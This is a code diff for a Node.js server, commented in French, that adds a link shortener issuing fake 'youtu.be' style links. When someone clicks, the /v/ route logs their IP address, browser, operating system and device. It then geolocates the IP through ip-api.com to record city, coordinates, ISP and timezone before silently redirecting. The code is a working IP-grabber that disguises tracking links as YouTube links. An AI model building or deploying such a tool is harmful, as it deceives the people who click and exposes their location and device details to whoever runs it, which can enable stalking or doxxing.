@@ -9,6 +9,115 @@ const PORT = process.env.PORT || 3000;
 // Store IPs in memory
 let trackedIPs = [];
 
+// Store URL mappings
+let urlMappings = new Map();
+
+// Fonction pour générer un ID YouTube-like
+function generateYouTubeId() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+    let result = '';
+    for (let i = 0; i < 11; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+// Route pour créer un lien court
+app.get('/api/shorten', (req, res) => {
+    const originalUrl = req.query.url;
+    if (!originalUrl) {
+        return res.status(400).json({ error: 'URL required' });
+    }
+
+    const shortId = generateYouTubeId();
+    urlMappings.set(shortId, originalUrl);
+    
+    // Limiter la taille du Map
+    if (urlMappings.size > 1000) {
+        const firstKey = urlMappings.keys().next().value;
+        urlMappings.delete(firstKey);
+    }
+
+    res.json({ 
+        shortUrl: `youtu.be/${shortId}`,
+        fullUrl: `${SERVER_URL}/v/${shortId}`
+    });
+});
+
+// Route pour rediriger les liens courts
+app.get('/v/:id', async (req, res) => {
+    const originalUrl = urlMappings.get(req.params.id);
+    if (!originalUrl) {
+        return res.redirect('https://youtube.com');
+    }
+    
+    // Traitement identique à la route /watch
+    try {
+        // Get real IP and clean it
+        let ip = req.realIp.replace('::ffff:', '');
+        ip = ip.split(',')[0].trim();
+        
+        console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);
+
+        // Parse user agent
+        const agent = useragent.parse(req.headers['user-agent']);
+        const deviceInfo = {
+            browser: agent.family,
+            browserVersion: agent.toVersion(),
+            os: agent.os.toString(),
+            device: agent.device.family,
+            isMobile: agent.device.family !== 'Other',
+            isBot: agent.isBot
+        };
+
+        console.log('\x1b[36m%s\x1b[0m', `Device info: ${JSON.stringify(deviceInfo)}`);
+
+        // Pour les tests locaux
+        if (ip === '::1' || ip === '127.0.0.1') {
+            ip = '8.8.8.8';
+            console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
+        }
+
+        try {
+            const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
+            
+            if (ipInfo.data.status === 'success') {
+                console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
+                
+                // Store in memory with device info
+                trackedIPs.push({
+                    ip: ip,
+                    country: ipInfo.data.country,
+                    city: ipInfo.data.city,
+                    latitude: ipInfo.data.lat,
+                    longitude: ipInfo.data.lon,
+                    timestamp: new Date().toISOString(),
+                    deviceInfo: deviceInfo,
+                    isp: ipInfo.data.isp,
+                    org: ipInfo.data.org,
+                    as: ipInfo.data.as,
+                    timezone: ipInfo.data.timezone
+                });
+
+                console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);
+
+                if (trackedIPs.length > 100) {
+                    trackedIPs = trackedIPs.slice(-100);
+                }
+            } else {
+                console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
+            }
+        } catch (apiError) {
+            console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
+        }
+
+        res.redirect(originalUrl);
+    } catch (error) {
+        console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
+        res.redirect('https://youtube.com');
+    }
+});
+
 // Add CORS headers
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
